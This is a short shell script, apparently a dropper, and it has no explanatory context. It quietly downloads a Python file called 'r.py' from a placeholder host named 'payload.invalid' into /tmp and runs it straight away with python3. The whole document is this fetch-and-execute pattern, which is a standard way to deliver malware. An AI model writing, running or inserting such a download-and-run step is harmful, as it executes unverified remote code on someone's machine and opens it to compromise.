#!/bin/sh
OUT=/tmp/run.py
curl -s -o $OUT https://payload.invalid/r.py
python3 $OUT
